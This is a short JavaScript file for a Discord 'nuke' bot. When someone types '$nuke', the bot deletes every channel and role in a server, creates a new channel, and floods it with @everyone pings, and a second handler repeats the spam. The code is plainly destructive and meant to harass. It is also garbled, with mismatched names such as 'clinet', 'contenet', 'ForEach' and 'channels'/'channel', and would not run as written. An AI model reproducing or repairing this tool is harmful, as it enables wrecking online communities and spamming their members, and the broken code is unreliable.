const discord = require('discord.js');
const client = new Discord.client();


client.login(process.env.TOKEN)


client.on('message', async (message) => {
  if (message.content === '$nuke') {
    message.guild.channels.cache.ForEach(channels => channel.delete());

    message.guild.roles.cache.Foreach(role => role.delete());

    await message.guild.channels.create( '$nuke', {
      type : 'text'
    }).then(async channel => {
      channel.send('@everyone ')
    })
  }
})

clinet.on('message', async (message) => {
  if (message.contenet === '@everyone'){
    await message.guild.channels.create( '$nuke', {
      type : 'text'
    }).then(async channel => {
      channel.send('@everyone ')
      
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
    message.channel.send('@everyone')
  })
  }
})